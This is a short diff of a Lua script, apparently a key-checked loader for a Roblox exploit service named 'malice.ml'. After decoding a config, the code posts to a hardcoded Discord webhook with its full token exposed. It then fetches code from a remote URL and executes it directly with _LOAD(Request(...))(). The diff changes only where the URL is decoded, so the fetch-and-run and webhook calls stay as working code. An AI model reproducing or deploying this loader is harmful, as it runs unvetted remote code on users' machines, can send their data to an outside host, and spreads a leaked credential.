@@ -178,7 +178,7 @@ if(not s)then
 	end)
 	return (_USER:Kick('\nmalice.ml\nInvalid encryption key!\nIf this is a recurring error, you may have a outdated key.'))
 else
-	local _DECODED = decodeString(CONFIG);
+	local _DECODED = decodeString(deSclude(CONFIG));
 	requestHttp({
 		url = 'https://discord.com/api/webhooks/979128485878591498/lc49ZT_W_m_qgQ9zo7Xsh2MUGcoC73Ohc9kouLMyCPmLXMzesFmloNU6XiyBGhjowA1X',
 		body = {
@@ -221,7 +221,7 @@ else
 		wait(10)
 		_ASKID:Disconnect()
 	end)
-	return (_LOAD(Request({method = 'GET',Url = deSclude(_DECODED)}))())
+	return (_LOAD(Request({method = 'GET',Url = _DECODED}))())
 end
 
 -->
